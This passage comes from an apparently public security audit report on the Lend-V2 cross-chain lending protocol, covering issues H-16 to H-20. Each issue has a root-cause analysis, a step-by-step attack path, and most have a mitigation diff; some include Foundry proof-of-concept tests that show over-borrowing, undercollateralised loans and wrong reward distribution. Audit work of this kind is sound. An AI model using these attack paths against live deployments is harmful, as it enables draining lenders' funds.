        console2.log("4. THEN distribute supplier rewards based on NEW balances");

        // Verify the liquidation worked correctly in terms of balance updates
        assertLt(deployerCollateralAfter, deployerCollateralBefore, "Deployer should have lost collateral");
        assertGt(liquidatorCollateralAfter, liquidatorCollateralBefore, "Liquidator should have gained collateral");
        assertLt(deployerBorrowAfter, deployerBorrowBefore, "Deployer's debt should be reduced");
        assertEq(debtRepaid, repayAmount, "Debt reduction should equal repay amount");
    }
}
```

LOGS

```bash
[PASS] test_liquidation_reward_timing_demonstrates_issue() (gas: 1381216)
Logs:
  === DEMONSTRATING REWARD DISTRIBUTION TIMING ISSUE ===
  
  PRE-LIQUIDATION STATE:
    Deployer collateral balance: 5000000000000
    Liquidator collateral balance: 0
    Deployer borrow balance: 600000000000000000000
   Deployer INDEX BEFORE 0
   Deployer INDEX BEFORE  1000000000000000000000000000000000000
   DEPLOYER BORROW INDEX BEFORE  1000000000000000000000000000000000000
   DEPLOYER BORROW INDEX BEFORE  0
  
  LIQUIDATION PROCESS (showing problematic order):
  1. liquidateBorrow() is called
  2. repayBorrowInternal() is called
  3. distributeBorrowerLend() is called BEFORE borrow balance update
     -> Borrower gets rewards on debt they're about to repay
  4. Borrow balance is updated (debt reduced)
  5. liquidateSeizeUpdate() is called
  6. distributeSupplierLend() is called BEFORE collateral balance update
     -> Borrower gets rewards on collateral they're about to lose
     -> Liquidator gets NO rewards on collateral they're about to gain
  7. Collateral balances are updated (seizure happens)
  
  POST-LIQUIDATION STATE:
    Deployer collateral balance: 1760000000000
    Liquidator collateral balance: 3149280000000
    Deployer borrow balance: 300000000000000000000
   Deployer SUPPLIER INDEX AFTER  0
   Deployer SUPPLIER INDEX AFTER  1000000000000000000000000000000000000
   DEPLOYER BORROW INDEX AFTER  1000000000000000000000000000000000000
   DEPLOYER BORROW INDEX AFTER  0
   Liquidator SUPPLIER INDEX AFTER  1000000000000000000000000000000000000
  
  CHANGES:
    Collateral seized from deployer: 3240000000000
    Collateral gained by liquidator: 3149280000000
    Debt repaid: 300000000000000000000
  
  THE PROBLEM:
  Because reward distribution happens BEFORE balance updates:
  1. Borrower got rewards based on their OLD (higher) debt amount
  2. Borrower got rewards based on their OLD (higher) collateral amount
  3. Liquidator got rewards based on their OLD (zero) collateral amount
  
  This means:
  - Borrowers are over-rewarded for debt they no longer have
  - Borrowers are over-rewarded for collateral they no longer have
  - Liquidators are under-rewarded for collateral they now have
  
  CORRECT ORDER SHOULD BE:
  1. Update borrow balance FIRST
  2. THEN distribute borrower rewards based on NEW balance
  3. Update collateral balances FIRST
  4. THEN distribute supplier rewards based on NEW balances
```

We can indeed see that before balance updates, rewards are calculated on OLD balances, not NEW balances. This is why the borrower gets rewards on debt they've already repaid and collateral they've already lost, while the liquidator gets NO rewards on newly seized collateral. The correct order should be to update borrow balance first, then distribute borrower rewards based on NEW balance, and then update collateral balances first, then:


In liquidateSeizeUpdate(), the supply-side reward distribution happens before the borrower’s collateral is actually removed and before the liquidator’s new position is recorded—so:
– the borrower gets rewards on collateral they’ve just lost,
– the liquidator gets no rewards on the tokens they’ve just seized.


## Mitigation


**Primary Solution: Reorder Operations**

The core fix is to update balances **before** distributing rewards. This ensures reward calculations are based on accurate, post-transaction balances.

### 1. Fix `repayBorrowInternal()` in CoreRouter.sol

**Current problematic order:**
```solidity
function repayBorrowInternal(...) internal {
    // ... setup code ...
    
    lendStorage.distributeBorrowerLend(_lToken, borrower);  // ❌ BEFORE balance update
    
    require(LErc20Interface(_lToken).repayBorrow(repayAmountFinal) == 0, "Repay failed");
    
    // Update borrow balances
    if (repayAmountFinal == borrowedAmount) {
        lendStorage.removeBorrowBalance(borrower, _lToken);
    } else {
        lendStorage.updateBorrowBalance(borrower, _lToken, borrowedAmount - repayAmountFinal, ...);
    }
}
```

**Fixed order:**
```solidity
function repayBorrowInternal(...) internal {
    // ... setup code ...
    
    require(LErc20Interface(_lToken).repayBorrow(repayAmountFinal) == 0, "Repay failed");
    
    // Update borrow balances FIRST
    if (repayAmountFinal == borrowedAmount) {
        lendStorage.removeBorrowBalance(borrower, _lToken);
    } else {
        lendStorage.updateBorrowBalance(borrower, _lToken, borrowedAmount - repayAmountFinal, ...);
    }
    
    lendStorage.distributeBorrowerLend(_lToken, borrower);  // ✅ AFTER balance update
}
```

### 2. Fix `liquidateSeizeUpdate()` in CoreRouter.sol

**Current problematic order:**
```solidity
function liquidateSeizeUpdate(...) internal {
    // ... calculate seizeTokens ...
    
    lendStorage.distributeSupplierLend(lTokenCollateral, sender);     // ❌ BEFORE balance update
    lendStorage.distributeSupplierLend(lTokenCollateral, borrower);   // ❌ BEFORE balance update
    
    // Update total investment
    lendStorage.updateTotalInvestment(borrower, lTokenCollateral, ...);
    lendStorage.updateTotalInvestment(sender, lTokenCollateral, ...);
}
```

**Fixed order:**
```solidity
function liquidateSeizeUpdate(...) internal {
    // ... calculate seizeTokens ...
    
    // Update total investment FIRST
    lendStorage.updateTotalInvestment(borrower, lTokenCollateral, 
        lendStorage.totalInvestment(borrower, lTokenCollateral) - seizeTokens);
    lendStorage.updateTotalInvestment(sender, lTokenCollateral, 
        lendStorage.totalInvestment(sender, lTokenCollateral) + (seizeTokens - currentReward));
    
    lendStorage.distributeSupplierLend(lTokenCollateral, sender);     // ✅ AFTER balance update
    lendStorage.distributeSupplierLend(lTokenCollateral, borrower);   // ✅ AFTER balance update
}
```




# Issue H-16: `CoreRouter.sol`’s `repayBorrowInternal` incorrectly updates `same chain` borrow balances on `cross chain` repayments 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/782 

## Found by 
0xbakeng, Kirkeelee, Waydou, dimah7, future, mahdifa, patitonar, t.aksoy

### Summary

When a user repays a cross-chain debt (`_isSameChain == false`), `CoreRouter.repayBorrowInternal` still executes the block labeled `// Update same-chain borrow balances.` As a result, the function wipes out or reduces the user’s same-chain `borrowBalance` even though only a cross chain loan was repaid. This can erase legitimate same chain debt and cause direct loss to lenders on that chain.

### Root Cause

In [`CoreRouter.sol:459`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L459-L504) within `repayBorrowInternal()`:

1. If `_isSameChain` is `true`, `borrowedAmount` is derived from `lendStorage.borrowWithInterestSame()`, and updating `borrowBalance` is correct.

2. If `_isSameChain` is `false` (repaying a cross-chain debt on Chain B), `borrowedAmount` is computed via `lendStorage.borrowWithInterest()` (from cross-chain records). The subsequent call to `LErc20Interface(_lToken).repayBorrow()` correctly reduces on chain debt.

3. However, immediately afterwards the code does:

```solidity
// Update same-chain borrow balances
if (repayAmountFinal == borrowedAmount) {
    lendStorage.removeBorrowBalance(borrower, _lToken);
    lendStorage.removeUserBorrowedAsset(borrower, _lToken);
} else {
    lendStorage.updateBorrowBalance(
        borrower, _lToken,
        borrowedAmount - repayAmountFinal,
        LTokenInterface(_lToken).borrowIndex()
    );
}
```
This block always executes, regardless of `_isSameChain`. Therefore, a cross chain repayment can delete or reduce the same chain borrow record for `_lToken`, even if the user still owes a large same chain loan.

Worth noting: removing `userBorrowedAsset()` when `repayAmountFinal == borrowedAmount` is intended to clear any zero balance loan of that token. But because `removeBorrowBalance` already deleted the wrong same chain debt, the set cleanup compounds the error.

### Internal Pre-conditions

1. The user must have a nonzero `same chain` borrow of `_lToken` recorded in `lendStorage.borrowBalance[borrower][_lToken]`.

2. The user (or a liquidator) is repaying a cross-chain loan for the same `_lToken` on Chain B (so `_isSameChain == false`).

2. `lendStorage.borrowWithInterest()` returns a positive borrowedAmount for the cross-chain entry.

### External Pre-conditions

N/A

### Vulnerability Path

1. Alice opens a same chain loan on Chain B.
- She calls CoreRouter.borrow() with _isSameChain = true.
- Internally, lendStorage.borrowWithInterestSame() returns 0 initially (new borrow), so it passes the collateral check.
- The borrow succeeds, and after:

- Alice now owes tokens on Chain B.

2. Alice previously opened a separate cross chain loan, collateralized by assets on `Chain A`.

- On Chain A, Alice posted collateral and called CrossChainRouter.borrowCrossChain().

- That message eventually delivered to Chain B’s router, which executed _handleBorrowCrossChainRequest and then CoreRouter.borrowForCrossChain().

- Alice now owes tokens via cross chain, in addition to the tokens on the same chain loan. The two debts live in separate storage slots.

3. Alice (or a liquidator) repays exactly the tokens toward her cross chain debt.

- They call `CoreRouter.repayBorrow()` with `_isSameChain = false`.

- That successfully repays the cross chain debt. At this point, the cross chain entry in `LendStorage` is removed. But the same-chain `borrowBalance[Alice]` is untouched so far.

4. The bug: immediately after repaying `cross chain`, code still runs the `//Update same-chain borrow balances` block.

Right after the `repayBorrow()` call, the code does:

```solidity
// <<< BUG: This runs even though _isSameChain == false >>>
// Update same chain borrow balances
if (repayAmountFinal == borrowedAmount) {
    // repayAmountFinal == borrowedAmount
    lendStorage.removeBorrowBalance();
    lendStorage.removeUserBorrowedAsset();
} else {
    lendStorage.updateBorrowBalance();
}
```

- Because `repayAmountFinal == borrowedAmount`, the removeBorrowBalance() call executes, deleting the same-chain debt.

- Then removeUserBorrowedAsset() fires (removing `lToken` from userBorrowedAssets). At this point, Alice’s only remaining borrow record on Chain B is the (just-repaid) cross chain entry, which higher-level logic may also clear now or shortly after. The same chain borrowed tokens record is gone.

5. Outcome: Alice’s same chain loan of has been wiped out by a repayment of the cross chain debt.

The protocol is left holding a “zero” borrow record, while in fact same chain token should still be owed.

### Impact

A single repayment of a cross chain loan fully erases/reduces a larger same chain debt. Lenders who funded lose their money. This is a direct loss of user (lender) funds without external constraint.

### PoC

See Vulnerability Path

### Mitigation

Only update same-chain borrow records if `_isSameChain == true`

```diff
-   // Update same-chain borrow balances
-   if (repayAmountFinal == borrowedAmount) {
-       lendStorage.removeBorrowBalance(borrower, _lToken);
-       lendStorage.removeUserBorrowedAsset(borrower, _lToken);
-   } else {
-       lendStorage.updateBorrowBalance(
-           borrower, _lToken,
-           borrowedAmount - repayAmountFinal,
-           LTokenInterface(_lToken).borrowIndex()
-       );
-   }
-   // Clean up userBorrowedAssets unconditionally if all debt cleared
-   if (repayAmountFinal == borrowedAmount) {
-       lendStorage.removeUserBorrowedAsset(borrower, _lToken);
-   }
+   if (_isSameChain) {
+       // Update same-chain borrow balances only for same-chain loans
+       if (repayAmountFinal == borrowedAmount) {
+           lendStorage.removeBorrowBalance(borrower, _lToken);
+           lendStorage.removeUserBorrowedAsset(borrower, _lToken);
+       } else {
+           lendStorage.updateBorrowBalance(
+               borrower, _lToken,
+               borrowedAmount - repayAmountFinal,
+               LTokenInterface(_lToken).borrowIndex()
+           );
+       }
+   }
+   // If the user no longer owes any lToken on this chain (same-chain or cross-chain), 
+   // it is still valid to remove from userBorrowedAssets.
+   if (repayAmountFinal == borrowedAmount) {
+       lendStorage.removeUserBorrowedAsset(borrower, _lToken);
+   }
```

This ensures that repaying a cross chain debt never touches the same chain `borrowBalance`.

# Issue H-17: Cross-Chain liquidation uses collateral seize amount instead of repayment amount for debt reduction 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/836 

## Found by 
Aenovir, Brene, Kvar, Sparrow\_Jac, Tigerfrake, francoHacker, future, ggg\_ttt\_hhh, h2134, jokr, m3dython, oxelmiguel, patitonar, rudhra1749, wickie, zraxx

## Title
Cross-Chain liquidation uses collateral seize amount instead of repayment amount for debt reduction

## Summary
A flaw in the cross-chain liquidation implementation causes the wrong `amount` value to be encoded and sent via LayerZero between chains. Specifically, `seizeTokens` the amount of collateral to be seized is mistakenly reused as the repayment amount during the final step of liquidation on Chain B. This misrepresentation leads to incorrect debt repayment logic, potentially under-repaying or overpaying loans and compromising protocol integrity.

## Root Cause 
The root cause of the issue is the incorrect reuse of the `amount` field in LayerZero cross-chain message payloads, which leads to the seize amount (collateral being transferred to the liquidator) being interpreted as the repay amount (debt being cleared on behalf of the borrower). This mix-up occurs because multiple messages in the liquidation flow reuse the same generic `Payload` structure containing a single `amount` field, without clearly distinguishing the semantic meaning of that field in each context.

1. The [`_executeLiquidationCore`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L264-L285) function is invoked when a liquidation is initiated and calculates; 
`seizeTokens`: the amount of collateral to be seized from the borrower and transferred to the liquidator.
```solidity
        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);
```

The LayerZero message is encoded with `seizeTokens` as `Payload.amount` and sent to Chain A — this is correct at this stage, as Chain A needs the seize amount to compute protocol share.
```solidity
        // Send message to Chain A to execute the seize
        _send(
            params.srcEid,
>>          seizeTokens,
            params.storedBorrowIndex,
            0,
            params.borrower,
            lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid), // Convert to Chain A version before sending
            msg.sender,
            params.borrowedAsset,
            ContractType.CrossChainLiquidationExecute
        );
```


2. The [`_handleLiquidationExecute`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L312-L366) handles final liquidation execution on Chain A (collateral chain). It uses the decoded `payload.amount` to calculate the `protocolSeizeShare` and send the message back to Chain B
```solidity
    function _handleLiquidationExecute(LZPayload memory payload, uint32 srcEid) private {
        // Execute the seize of collateral
>>      uint256 protocolSeizeShare = mul_(payload.amount, Exp({mantissa: lendStorage.PROTOCOL_SEIZE_SHARE_MANTISSA()}));

        require(protocolSeizeShare < payload.amount, "Invalid protocol share");

        uint256 liquidatorShare = payload.amount - protocolSeizeShare;

        //...SNIP...

        _send(
            srcEid,
>>          payload.amount,
            0,
            0,
            payload.sender,
            payload.destlToken,
            payload.liquidator,
            payload.srcToken,
            ContractType.LiquidationSuccess
        );
    }
```
When preparing the message back to Chain B, the function reuses `payload.amount` instead of explicitly encoding `repayFinalAmount`.

3. The [`_handleLiquidationSuccess`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L443-L471) function receives the second message (from Chain A). It assumes the incoming `payload.amount` represents the repay amount and proceeds to repay the borrower’s debt:
```solidity
        // Now that we know the borrow position and srcEid, we can repay the borrow using the escrowed tokens
        // repayCrossChainBorrowInternal will handle updating state and distributing rewards.
        repayCrossChainBorrowInternal(
            payload.sender, // The borrower
            payload.liquidator, // The liquidator (repayer)
>>          payload.amount, // Amount to repay
            payload.destlToken, // lToken representing the borrowed asset on this chain
            srcEid // The chain where the collateral (and borrow reference) is tracked
        );
```
Since `payload.amount` contains `seizeTokens` (collateral seized) instead of `repayFinalAmount`, the borrower’s debt is incorrectly reduced by the value of the seized collateral rather than the actual repayment.

## Internal Pre-conditions
1. Cross-chain liquidation initiated on Chain B
2. Borrower has both:
   - Debt position on Chain B
   - Collateral position on Chain A
3. Liquidator specifies valid `repayAmount`

## External Pre-conditions
None

## Attack Path
1. A liquidation is triggered cross-chain.
2. In `_executeLiquidationCore`, `seizeTokens` is used as the `amount` and sent to Chain A.
3. Chain A processes the message, calculates internal protocol shares, and prepares to finalize liquidation.
4. In `_handleLiquidationExecute`, the message sent back to Chain B reuses `payload.amount`, assuming it represents the `repayAmount`, but it is actually `seizeTokens`.
5. Chain B’s `_handleLiquidationSuccess` receives the message and passes `payload.amount` (seizeTokens) to `repayCrossChainBorrowInternal`.
6. Debt is repaid using a different amount parameter

## Impact
The function `repayCrossChainBorrowInternal` is supposed to reduce the borrower’s debt using the repayFinalAmount. However, due to passing `seizeTokens` (collateral amount) instead of `repayFinalAmount`, the function receives an incorrect value. This leads to incorrect updates to the borrower's debt position, resulting in under-repayment or over-repayment.

## POC
None

## Mitigation
In `_handleLiquidationExecute` (Chain A), ensure `params.repayAmount` is encoded and sent in the LayerZero message to Chain B:
```diff
        _send(
            srcEid,
-           payload.amount,
+           params.repayAmount,
            0,
            0,
            payload.sender,
            payload.destlToken,
            payload.liquidator,
            payload.srcToken,
            ContractType.LiquidationSuccess
        );
```


# Issue H-18: Multiple Cross-Chain borrows using same collateral 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/851 

## Found by 
0x15, 0xDgiin, 0xEkko, 0xbakeng, 0xgee, 4n0nx, Aenovir, PNS, Tychai0s, dystopia, gkrastenov, lazyrams352, patitonar, pv, realsungs, xiaoming90

## Summary
The failure to lock collateral in `borrowCrossChain` before sending cross-chain borrow requests via LayerZero V2 enables users to initiate multiple borrow requests on different chains (e.g., Chain B and Chain C) using the same collateral on Chain A, resulting in loans exceeding the collateral’s capacity and significant protocol loss.

## Root Cause
In `CrossChainRouter.sol` within the `borrowCrossChain` function, the collateral amount is calculated but not locked in `lendStorage` before sending a borrow request via `_lzSend`. The collateral is only registered in `_handleValidBorrowRequest` after receiving confirmation from the destination chain, allowing multiple requests to use the same collateral concurrently.

[CrossChainRouter.borrowCrossChain](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CrossChainRouter.sol#L113-L113)

## Internal Pre-conditions
1. The user needs to have sufficient collateral on Chain A (e.g., $1000 USDC in an lToken pool).
2. The protocol needs to support cross-chain borrowing on at least two destination chains (e.g., Chain B and Chain C).
3. The lToken pools on destination chains need to have sufficient liquidity to process borrow requests.
4. The collateral factor (e.g., 75%) needs to allow significant borrowing relative to the collateral.

## External Pre-conditions
1. The underlying token prices (e.g., USDC) need to remain stable to ensure consistent collateral and borrow valuations.
2. The LayerZero V2 network needs to process messages with minimal delay to allow rapid request submission.

## Attack Path
1. A user with 1000 USDC collateral on Chain A calls `borrowCrossChain` twice in the same block:
   - Request 1: Borrow 750 USDC on Chain B.
   - Request 2: Borrow 750 USDC on Chain C.
2. Both requests use `getHypotheticalAccountLiquidityCollateral`, which reports 1000 USDC collateral, as no borrow is yet registered.
3. Chain B receives the request, verifies `payload.collateral` (1000 USDC) >= 750 USDC, and executes `borrowForCrossChain`, transferring 750 USDC to the user.
4. Chain C does the same, transferring another 750 USDC.
5. Both chains send `ValidBorrowRequest` messages back to Chain A, which registers two borrows totaling 1500 USDC in `_handleValidBorrowRequest`.
6. User does not repay the debt and sacrifices the collateral, leaving with $500 in profit.

## Impact
The protocol suffers a significant financial loss by granting loans exceeding the collateral’s capacity (e.g., $750 loss for 1500 USDC borrowed against 1000 USDC collateral). The issue scales with the number of chains, potentially leading to catastrophic losses (e.g., 7500 USDC for 10 chains).

## PoC
The issue can be demonstrated as follows:
- Deploy Lend-V2 on three chains: Chain A (collateral), Chain B, and Chain C (borrowing). A user supplies 1000 USDC collateral on Chain A in an lToken pool with a 75% collateral factor.
- The user calls `borrowCrossChain` twice in one block:
  - Chain B: 750 USDC borrow.
  - Chain C: 750 USDC borrow.
- `getHypotheticalAccountLiquidityCollateral` returns 1000 USDC collateral for both requests, as no borrow is registered.
- Chain B verifies `payload.collateral` (1000 USDC) >= 750 USDC, executes `borrowForCrossChain`, and transfers 750 USDC.
- Chain C does the same, transferring 750 USDC.
- Chain A receives `ValidBorrowRequest` messages, registering 1500 USDC total borrow.
- For a $10,000 collateral, the loss is $7500 across two chains (75% loss).

## Mitigation
Lock the collateral in `lendStorage` before sending the borrow request in `borrowCrossChain` by tracking pending borrow requests and deducting their collateral impact. Use a nonce-based lock to prevent concurrent requests for the same collateral. 
In `_handleValidBorrowRequest`, clear the pending borrow lock after registering the borrow. Add a check in `borrowCrossChain` to prevent new requests if a pending borrow exists for the same user and collateral.

# Issue H-19: User can redeem collateral immediately after initiating the borrow, leading undercollateralization. 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/909 

## Found by 
0xhp9, 1337web3, Constant, Fade, Hueber, Kirkeelee, Leaningone, befree3x, chaos304, coin2own, hgrano, owanemi, t.aksoy, xiaoming90, zacwilliamson

### Summary

When a user initiates a cross-chain borrow, during a pending cross-chain borrow operation, the user redeems their collateral immediately after initiating the borrow,  which could result in undercollateralization once the borrow is completed on the destination chain.

### Root Cause

- function borrowCrossChain() in CrossChainRouter.sol : https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L113C5-L154 
- function redeem() in CoreRouter.sol: https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L100-L138

In CrossChainRouter.borrowCrossChain(), after adding collateral tracking on the source chain, it sends a cross-chain message. The collateral is added to storage via lendStorage.addUserSuppliedAsset, but no locking mechanism is applied to restrict access to it. After this function is called, the user can still interact with their collateral, like calling redeem() on the source chain.
```solidity
  function borrowCrossChain(uint256 _amount, address _borrowToken, uint32 _destEid) external payable {
        // validations

        // Then adding collateral tracking on source chain
        lendStorage.addUserSuppliedAsset(msg.sender, _lToken);

        if (!isMarketEntered(msg.sender, _lToken)) {
            enterMarkets(_lToken);
        }
        // get collateral
        // Get current collateral amount for the LayerZero message
        // This will be used on dest chain to check if sufficient
        (, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender,LToken(_lToken), 0, 0);

        // @audit: Send BorrowCrossChain message without setting any lock
        Send message to destination chain with verified sender
        _send(
            _destEid,
            _amount,
            0, 
            collateral,
            msg.sender,
            destLToken,
            address(0), 
            _borrowToken,
            ContractType.BorrowCrossChain
        );
    }
```
The CoreRouter.redeem function allows the user to redeem their supplied tokens if they have sufficient balance and liquidity
```solidity
  function redeem(uint256 _amount, address payable _lToken) external returns (uint256) {
        //Checks
        require(lendStorage.totalInvestment(msg.sender, _lToken) >= _amount, "Insufficient balance");

        // Check liquidity
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), _amount, 0);
        require(collateral >= borrowed, "Insufficient liquidity");

        // proceeds to redeem
    }
```
Issue arises: The liquidity check in lendStorage.getHypotheticalAccountLiquidityCollateral only considers existing borrows. It might not account for the pending cross-chain borrow (the new borrow has not been recorded yet, pending the message to the destination chain).
Before the LZ message is finalized, when redeeming, the user still has sufficient liquidity to redeem part of their collateral, so the redemption still passes.

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

1. User supplies collateral on Chain A in contract CoreRouter.sol and calls borrowCrossChain() in CrossChainRouter.sol to borrow on Chain B - sending LZ message.
2. The user calls redeem() immediately on Chain A in contract CoreRouter.sol to redeem part of their collateral.
2. The liquidity check in redeem() passes because the pending borrow is not yet reflected in the borrow balance.
3. LZ message finalized on Chain B, the position on Chain A becomes undercollateralized - The user can borrow without enough collateral.
4. The user can repeat this process to drain the pool.

### Impact

Users can borrow on other chains without having enough collateral on the source chain. The user can repeat this process to drain the pool.

### PoC

N/A

### Mitigation

Add a flag in lendStorage to lock collateral when a cross-chain borrow is initiated.

# Issue H-20: Incorrect Borrowed Asset Tracking Enables Over-Borrowing 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/917 

## Found by 
37H3RN17Y2, Brene, Tigerfrake, jokr, rudhra1749

## Title 
Incorrect Borrowed Asset Tracking Enables Over-Borrowing

## Summary
In scenarios where a user borrows the same token both via cross-chain and same-chain transactions, the protocol can mistakenly treat the borrower as having no active borrow after repaying just the cross-chain portion. This misrepresentation allows the user to initiate new same-chain borrows that exceed their actual borrowing capacity, due to underreporting of their outstanding debt.

## Root Cause
When a user borrows a token—either same-chain or across chains—the corresponding `lToken` is added to their list of borrowed assets using:
```solidity
    lendStorage.addUserBorrowedAsset(msg.sender, _lToken);
```
Let’s consider a situation where a user, say Alice, performs the following sequence:
1. **Cross-chain borrow**:
   * Alice supplies `tokenB` as collateral on `chainB`.
   * She borrows `tokenA` on `chainA`, which registers `lTokenA` as a borrowed asset.

2. **Same-chain borrow**:
   * She also supplies `tokenC` as collateral directly on `chainA`.
   * Again borrows `tokenA` (same asset) on `chainA`. Since `lTokenA` is already listed in her borrowed assets, no update occurs.

Later, Alice decides to fully repay the cross-chain portion of her loan. The debt tracking is handled inside [`_updateRepaymentState()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L505-L542), which includes the following:

```solidity
if (repayAmountFinal == borrowedAmount) {
    lendStorage.removeCrossChainCollateral(borrower, _token, index);
    if (userCrossChainCollaterals.length == 1) {
>>      lendStorage.removeUserBorrowedAsset(borrower, _lToken);
    }
}
```
At this point, the borrowed asset `lTokenA` is removed from the tracking list even though Alice still has a same-chain outstanding borrow for that token.
After the removal, when Alice makes a new borrow call for more `tokenA` on `chainA`, the liquidity check uses the following function:

```solidity
    (borrowed, collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, _lToken, 0, _amount);
```
Inside [`getHypotheticalAccountLiquidityCollateral()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L385-L467), both the collateral and borrowed positions are calculated based on assets tracked in `userSuppliedAssets` and `userBorrowedAssets`.
Since `lTokenA` was removed during the cross-chain repay step, the `borrowedAssets` array becomes empty:

```solidity
    address[] memory borrowedAssets = userBorrowedAssets[account].values();
```
This leads to the loop calculating `sumBorrowPlusEffects` being skipped entirely:

```solidity
    for (uint256 i = 0; i < borrowedAssets.length;) {
        // skipped: no borrowed assets tracked
    }
```
The result is that the borrow calculation only includes the new requested amount (`borrowAmount`) and completely ignores the existing borrow balance. This makes `borrowed` appear artificially low.
The liquidity check:
```solidity
    require(collateral >= borrowAmount, "Insufficient collateral");
```
then passes incorrectly because it only compares `collateral` against the new `borrowAmount`, instead of the actual total outstanding borrow.

## Internal Preconditions
1. The protocol does not cross-reference actual outstanding balances when deciding to remove a borrowed asset.
2. Same-token borrow tracking conflates cross-chain and same-chain borrowing into a single entry.

## External Preconditions
1. The user must perform both a cross-chain and a same-chain borrow of the same token.
2. They must fully repay the cross-chain loan.
3. They must attempt a new same-chain borrow of the same asset.

## Attack Path
* User deposits collateral and borrows on both chains.
* User repays only the cross-chain portion.
* Asset is removed from `borrowedAssets`.
* New same-chain borrow is under-validated.
* User borrows beyond collateral limit.

## Impact
* Protocol underestimates user borrow positions, violating intended collateralization constraints.
* Borrowers may end up with loans far exceeding allowed limits, making the system vulnerable to insolvency during market downturns.
* Malicious actors could deliberately exploit this flaw to drain excess liquidity from the protocol without appropriate backing.

## Poc
1. Add the following functions in `test/TestBorrowingCrossChain.t.sol`;
```solidity
    function _supplyAWithUser(uint256 amount, address user) internal returns (address token, address lToken) {
        // Deal ether for LayerZero fees
        vm.deal(address(routerA), 1 ether);

        token = supportedTokensA[0];
        lToken = lendStorageA.underlyingTolToken(token);

        vm.startPrank(user);
        ERC20Mock(token).mint(user, amount);
        IERC20(token).approve(address(coreRouterA), amount);
        coreRouterA.supply(amount, token);
        vm.stopPrank();
    }

    function _supplyC(uint256 amount) internal returns (address token, address lToken) {
        // Deal ether for LayerZero fees
        vm.deal(address(routerA), 1 ether);

        token = supportedTokensA[1];
        lToken = lendStorageA.underlyingTolToken(token);
        
        vm.startPrank(deployer);
        ERC20Mock(token).mint(deployer, amount);
        IERC20(token).approve(address(coreRouterA), amount);
        coreRouterA.supply(amount, token);
        vm.stopPrank();
    }
```
2. Add the foolowing test in the same file:
```solidity
    function test_cross_chain_repay_removes_borrowed_asset_and_allows_over_borrow
    (
        uint256 amountToSupply,
        uint256 amountToBorrow
    ) public {
        // Bound amount between 1e18 and 1e30 to ensure reasonable test values
        amountToSupply = bound(amountToSupply, 1e18, 1e30);

        // Fund Router A with ETH for LayerZero fees
        vm.deal(address(routerB), 1 ether);

        // First supply tokens as collateral on Chain A
        (address tokenB, address lTokenB) = _supplyB(amountToSupply);

        // Deal ether for LayerZero fees
        vm.deal(address(routerB), 1 ether);

        // some random user supplys tokenA in chainA
        (address tokenA, address lTokenA) = _supplyAWithUser(amountToSupply * 2, address(1));

        // Calculate maximum allowed borrow (using actual collateral factor) --> scale down for precision loss
        uint256 maxBorrow = (lendStorageB.getMaxBorrowAmount(deployer, lTokenB) * 0.9e18) / 1e18;

        uint256 boundedBorrow = bound(amountToBorrow, 0.1e18, maxBorrow);

        // Get initial balances
        uint256 initialTokenBalance = IERC20(lendStorageB.underlyingToDestUnderlying(tokenB, CHAIN_A_ID)).
            balanceOf(deployer);

        vm.startPrank(deployer);

        // CROSS CHAIN BORROW
        routerB.borrowCrossChain(boundedBorrow, tokenB, CHAIN_A_ID);

        vm.stopPrank();

        // Verify the borrow was successful
        assertEq(
            IERC20(lendStorageB.underlyingToDestUnderlying(tokenB, CHAIN_A_ID)).balanceOf(deployer) 
                - initialTokenBalance,
            boundedBorrow,
            "Should receive correct amount of borrowed tokens"
        );

        // deployer supplys tokenC as collateral in chainA and borrow tokenA
        _supplyC(amountToSupply);

        vm.startPrank(deployer);

        // MAX BORROW AMOUNT CAPPED AT 70%
        // calculate maxBorrowAmount based on this deposited collateral
        uint256 maxBorrowAmount = (amountToSupply * 70) / 100;

        // FIRST SAME-CHAIN BORROW
        // NOTE: User borrows half the maxBorrowAmount
        coreRouterA.borrow(maxBorrowAmount / 2, tokenA);

        // check user borrow tokens
        address[] memory currentDeployerBorrowedAssets = lendStorageA.getUserBorrowedAssets(deployer);
        assertEq(currentDeployerBorrowedAssets.length, 1, "Deployer should have one borrowed assets");
        
        // Check destination borrow details
        LendStorage.Borrow[] memory userBorrows = lendStorageB.getCrossChainBorrows(deployer, tokenB);

        // FULL CROSS CHAIN BORROW REPAYMENT
        uint256 fullAmount = userBorrows[0].principle;
        ERC20Mock(tokenA).mint(deployer, fullAmount);
        IERC20(tokenA).approve(address(coreRouterA), fullAmount);

        routerA.repayCrossChainBorrow(deployer, fullAmount, lTokenA, 31337);

        // check user borrow tokens
